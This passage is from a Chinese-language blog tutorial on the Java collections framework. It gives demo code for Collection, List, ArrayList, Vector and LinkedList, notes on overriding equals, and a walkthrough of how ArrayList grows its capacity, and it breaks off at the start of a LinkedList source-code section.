<h2 id="5-Collection使用（2）"><a href="#5-Collection使用（2）" class="headerlink" title="5 Collection使用（2）"></a>5 Collection使用（2）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 新建 Collection 对象</span></span><br><span class="line">        Collection collection = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student(<span class="string">&quot;张无忌&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student(<span class="string">&quot;王二&quot;</span>, <span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        collection.add(s1);</span><br><span class="line">        collection.add(s2);</span><br><span class="line">        collection.add(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数：&quot;</span> + collection.size());</span><br><span class="line">        System.out.println(collection.toString());</span><br><span class="line">        <span class="comment">// 删除</span></span><br><span class="line">        collection.remove(s1);</span><br><span class="line">        System.out.println(<span class="string">&quot;删除之后：&quot;</span> + collection.size());</span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : collection) &#123;</span><br><span class="line">            Student s = (Student)o;</span><br><span class="line">            System.out.println(s.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator it = collection.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Student s = (Student)it.next();</span><br><span class="line">            System.out.println(s.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="6-List接口"><a href="#6-List接口" class="headerlink" title="6 List接口"></a>6 List接口</h2><h3 id="一、方法"><a href="#一、方法" class="headerlink" title="一、方法"></a>一、方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, Object o)</span>  <span class="comment">// 在index位置插入对象o</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection c)</span>  <span class="comment">// 将一个集合中的元素添加到此集合中的index位置</span></span></span><br><span class="line"><span class="function">Object <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span>  <span class="comment">// 返回集合中指定位置的元素</span></span></span><br><span class="line"><span class="function">List <span class="title">subList</span><span class="params">(<span class="keyword">int</span> fromIndex, <span class="keyword">int</span> toIndex)</span>  <span class="comment">// 返回fromIndex和toIndex之间的集合元素</span></span></span><br></pre></td></tr></table></figure>
<h2 id="7-List使用（1）"><a href="#7-List使用（1）" class="headerlink" title="7 List使用（1）"></a>7 List使用（1）</h2><h3 id="一、ListIterator与Iterator区别"><a href="#一、ListIterator与Iterator区别" class="headerlink" title="一、ListIterator与Iterator区别"></a>一、<code>ListIterator</code>与<code>Iterator</code>区别</h3><p>（1）<code>ListIterator</code>可以任意方向遍历，<code>Iterator</code>只能向后遍历</p>
<p>（2）<code>ListIterator</code>可以添加和修改元素，<code>Iterator</code>只能删除元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @author Vict0r</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ListIterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        list.add(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;小米&quot;</span>);</span><br><span class="line">        list.add(<span class="number">0</span>, <span class="string">&quot;华为&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数：&quot;</span> + list.size());</span><br><span class="line">        System.out.println(list.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除元素</span></span><br><span class="line"><span class="comment">//        list.remove(0);</span></span><br><span class="line">        System.out.println(list.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); ++i) &#123;</span><br><span class="line">            System.out.println(list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// foreach</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : list) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator it = list.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 列表迭代器 https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/ListIterator.html</span></span><br><span class="line">        ListIterator lit = list.listIterator();</span><br><span class="line">        System.out.println(<span class="string">&quot;列表迭代器从前向后&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (lit.hasNext()) &#123;</span><br><span class="line">            System.out.println(lit.nextIndex() + <span class="string">&quot;:&quot;</span> + lit.next());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;列表迭代器从后向前&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (lit.hasPrevious()) &#123;</span><br><span class="line">            System.out.println(lit.previousIndex() + <span class="string">&quot;:&quot;</span> + lit.previous());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(list.contains(<span class="string">&quot;苹果&quot;</span>));</span><br><span class="line">        System.out.println(list.isEmpty());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取位置</span></span><br><span class="line">        System.out.println(list.indexOf(<span class="string">&quot;华为&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="8-List使用（2）"><a href="#8-List使用（2）" class="headerlink" title="8 List使用（2）"></a>8 List使用（2）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @author Vict0r</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        List list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        list.add(<span class="number">20</span>);</span><br><span class="line">        list.add(<span class="number">30</span>);</span><br><span class="line">        list.add(<span class="number">40</span>);</span><br><span class="line">        list.add(<span class="number">50</span>);</span><br><span class="line">        list.add(<span class="number">60</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数&quot;</span> + list.size());</span><br><span class="line">        System.out.println(list.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除元素</span></span><br><span class="line">        list.remove(<span class="number">0</span>);  <span class="comment">// 根据下标删除元素</span></span><br><span class="line"><span class="comment">//        list.remove((Object)20);  // 根据对象删除</span></span><br><span class="line"><span class="comment">//        list.remove(new Integer(20));  // 根据值删除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;删除元素：&quot;</span> + list.size());</span><br><span class="line">        System.out.println(list.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sublist 返回子集合 左闭右开区间</span></span><br><span class="line">        List sublist = list.subList(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(sublist);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="9-List-实现类"><a href="#9-List-实现类" class="headerlink" title="9 List 实现类"></a>9 List 实现类</h2><h3 id="一、ArrayList【重点】"><a href="#一、ArrayList【重点】" class="headerlink" title="一、ArrayList【重点】"></a>一、<code>ArrayList</code>【重点】</h3><p>（1）数组结构实现，查询快、增删慢</p>
<p>（2）jdk1.2版本加入，运行效率快、线程不安全</p>
<h3 id="二、Vector"><a href="#二、Vector" class="headerlink" title="二、Vector"></a>二、<code>Vector</code></h3><p>（1）数组结构实现，查询快、增删慢</p>
<p>（2）jdk1.0版本，运行效率慢、线程安全</p>
<h3 id="三、LinkedList"><a href="#三、LinkedList" class="headerlink" title="三、LinkedList"></a>三、<code>LinkedList</code></h3><p>（1）链表结构实现，增删快、查询慢</p>
<h2 id="10-ArrayList使用"><a href="#10-ArrayList使用" class="headerlink" title="10 ArrayList使用"></a>10 ArrayList使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @author Vict0r</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collection.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ListIterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        ArrayList arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;刘德华&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student(<span class="string">&quot;郭富城&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student(<span class="string">&quot;梁朝伟&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        arrayList.add(s1);</span><br><span class="line">        arrayList.add(s2);</span><br><span class="line">        arrayList.add(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数&quot;</span> + arrayList.size());</span><br><span class="line">        System.out.println(arrayList.toString());</span><br><span class="line">        <span class="comment">// 删除元素</span></span><br><span class="line"><span class="comment">//        arrayList.remove(new Student(&quot;刘德华&quot;, 20));</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;删除之后&quot; + arrayList.size());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator it = arrayList.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            Student s = (Student)it.next();</span><br><span class="line">            System.out.println(s.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 前向迭代</span></span><br><span class="line">        ListIterator lit = arrayList.listIterator();</span><br><span class="line">        <span class="keyword">while</span> (lit.hasNext()) &#123;</span><br><span class="line">            Student s = (Student)lit.next();</span><br><span class="line">            System.out.println(s.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 列表迭代器</span></span><br><span class="line">        <span class="keyword">while</span> (lit.hasPrevious()) &#123;</span><br><span class="line">            Student s = (Student)lit.previous();</span><br><span class="line">            System.out.println(s.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(arrayList.contains(<span class="keyword">new</span> Student(<span class="string">&quot;梁朝伟&quot;</span>, <span class="number">18</span>)));</span><br><span class="line">        System.out.println(arrayList.isEmpty());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找</span></span><br><span class="line">        System.out.println(arrayList.indexOf(<span class="keyword">new</span> Student(<span class="string">&quot;梁朝伟&quot;</span>, <span class="number">18</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="一、重写equals"><a href="#一、重写equals" class="headerlink" title="一、重写equals"></a>一、重写<code>equals</code></h3><p>如上代码中删除元素的部分，由于会心创建对象，所以实际上并不会删除原有的元素，因为<code>remove</code>会通过<code>Object</code>的<code>equals</code>方法，比较当前元素和集合中元素地址是否一样，一样就删除。如果想要通过这种方式删除元素，则需要重写<code>Student</code>类中的<code>equals</code>方法。</p>
<ul>
<li>如何重写？</li>
</ul>
<p>直接输入方法名称即可看到提示</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211220171406074.png" alt="image-20211220171406074"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211220171548198.png" alt="image-20211220171548198"></p>
<p>一直next即可，自动填充重写的函数代码</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211220171625244.png" alt="image-20211220171625244"></p>
<h2 id="11-ArrayList源码分析"><a href="#11-ArrayList源码分析" class="headerlink" title="11 ArrayList源码分析"></a>11 ArrayList源码分析</h2><h3 id="一、变量"><a href="#一、变量" class="headerlink" title="一、变量"></a>一、变量</h3><p>（1）默认容量大小10</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Default initial capacity.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<p>注意：如果没有向集合中添加任何元素，容量为0，源码的体现如下；添加任意元素后，容量为10，参考add源码部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructs an empty list with an initial capacity of ten.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（2）存放元素的数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* The array buffer into which the elements of the ArrayList are stored.</span></span><br><span class="line"><span class="comment">* The capacity of the ArrayList is the length of this array buffer. Any</span></span><br><span class="line"><span class="comment">* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span></span><br><span class="line"><span class="comment">* will be expanded to DEFAULT_CAPACITY when the first element is added.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">transient</span> Object[] elementData; <span class="comment">// non-private to simplify nested class access</span></span><br></pre></td></tr></table></figure>
<p>（3）实际的元素个数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* The size of the ArrayList (the number of elements it contains).</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@serial</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> size;</span><br></pre></td></tr></table></figure>
<h3 id="二、方法-1"><a href="#二、方法-1" class="headerlink" title="二、方法"></a>二、方法</h3><p>（1）<code>add()</code>添加元素，是如何添加的？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Appends the specified element to the end of this list.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> e element to be appended to this list</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;<span class="doctag">@link</span> Collection#add&#125;)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    elementData[size++] = e;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>size初始为0，然后再看看<code>ensureCapacityInternal()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculateCapacity</span><span class="params">(Object[] elementData, <span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;   <span class="comment">// 初始时两者皆为空，必成立</span></span><br><span class="line">        <span class="comment">// minCapacity就是size+1=1，10和1比，10大，返回10</span></span><br><span class="line">        <span class="keyword">return</span> Math.max(DEFAULT_CAPACITY, minCapacity);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minCapacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));  </span><br><span class="line">    <span class="comment">// 经过calculateCapacity后函数变成ensureExplicitCapacity(10)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    modCount++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)  <span class="comment">// 10-0显然大于0</span></span><br><span class="line">        grow(minCapacity);  <span class="comment">// 数组扩容，grow(10)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">int</span> oldCapacity = elementData.length;  <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);  <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)  <span class="comment">// 0-10&lt;0</span></span><br><span class="line">        newCapacity = minCapacity;  <span class="comment">// 10给到newCapacity</span></span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)  <span class="comment">// MAX_ARRAY_SIZE=Integer.MAX_VALUE-8必不执行</span></span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);  <span class="comment">// Arrays.copyOf(0,10)</span></span><br><span class="line">    <span class="comment">// 因此添加任意元素后，容量为10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、ArrayList扩容"><a href="#三、ArrayList扩容" class="headerlink" title="三、ArrayList扩容"></a>三、ArrayList扩容</h3><p>元素加满后，1.5倍扩容</p>
<h2 id="12-Vector使用"><a href="#12-Vector使用" class="headerlink" title="12 Vector使用"></a>12 Vector使用</h2><p><a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Vector.html">https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Vector.html</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        Vector vector = <span class="keyword">new</span> Vector&lt;&gt;();</span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        vector.add(<span class="string">&quot;草莓&quot;</span>);</span><br><span class="line">        vector.add(<span class="string">&quot;芒果&quot;</span>);</span><br><span class="line">        vector.add(<span class="string">&quot;西瓜&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数&quot;</span> + vector.size());</span><br><span class="line">        <span class="comment">// 删除</span></span><br><span class="line"><span class="comment">//        vector.remove(0);</span></span><br><span class="line"><span class="comment">//        System.out.println(vector.toString());</span></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line"><span class="comment">//        for (Object o : vector) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(o);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用枚举器</span></span><br><span class="line">        Enumeration en = vector.elements();</span><br><span class="line">        <span class="keyword">while</span> (en.hasMoreElements()) &#123;</span><br><span class="line">            Object o = en.nextElement();</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(vector.contains(<span class="string">&quot;西瓜&quot;</span>));</span><br><span class="line">        System.out.println(vector.isEmpty());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其他方法</span></span><br><span class="line">        System.out.println(vector.get(<span class="number">0</span>));</span><br><span class="line">        System.out.println(vector.lastElement());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="13-LinkedList使用"><a href="#13-LinkedList使用" class="headerlink" title="13 LinkedList使用"></a>13 LinkedList使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collection.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.ListIterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        LinkedList linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student(<span class="string">&quot;刘德华&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        Student s2 = <span class="keyword">new</span> Student(<span class="string">&quot;郭富城&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student(<span class="string">&quot;梁朝伟&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        linkedList.add(s1);</span><br><span class="line">        linkedList.add(s2);</span><br><span class="line">        linkedList.add(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数：&quot;</span> + linkedList.size());</span><br><span class="line">        System.out.println(linkedList.toString());</span><br><span class="line">        <span class="comment">// 删除</span></span><br><span class="line"><span class="comment">//        linkedList.remove(0);</span></span><br><span class="line"><span class="comment">//        linkedList.remove(s1);</span></span><br><span class="line"><span class="comment">//        System.out.println(linkedList.toString());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linkedList.size(); ++i) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;普通for:&quot;</span> + linkedList.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object o : linkedList) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;foreach:&quot;</span> + o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator it = linkedList.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;迭代器:&quot;</span> + it.next().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 列表迭代器</span></span><br><span class="line">        ListIterator lit = linkedList.listIterator();</span><br><span class="line">        <span class="keyword">while</span> (lit.hasNext()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;列表迭代器:&quot;</span> + lit.next().toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(linkedList.contains(s1));</span><br><span class="line">        System.out.println(linkedList.isEmpty());</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="14-LinkedList源码分析"><a href="#14-LinkedList源码分析" class="headerlink" title="14 LinkedList源码分析"></a>14 LinkedList源码分析</h2><p>（1）<code>add</code>方法</p>
